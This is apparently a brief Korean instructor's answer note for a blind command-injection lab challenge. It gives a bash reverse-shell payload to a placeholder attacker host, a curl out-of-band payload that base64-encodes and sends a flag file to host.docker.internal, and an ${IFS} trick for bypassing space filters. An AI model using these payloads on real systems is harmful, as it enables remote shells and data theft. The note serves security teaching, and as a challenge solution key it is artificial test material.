# [강사용] Command Injection (원본 풀이 · Blind)
결과가 안 보임(Blind) → OOB 로 유출. flag 는 `/command_injection_flag.txt`(444).
리버스셸:
```
/?cmd=bash -c "bash -i >%26 /dev/tcp/ATTACKER/PORT 0>%261"
```
또는 HTTP OOB:
```
/?cmd=curl http://host.docker.internal:8000/?d=$(cat /command_injection_flag.txt|base64)
```
공백 제한 시 `${IFS}` 활용.
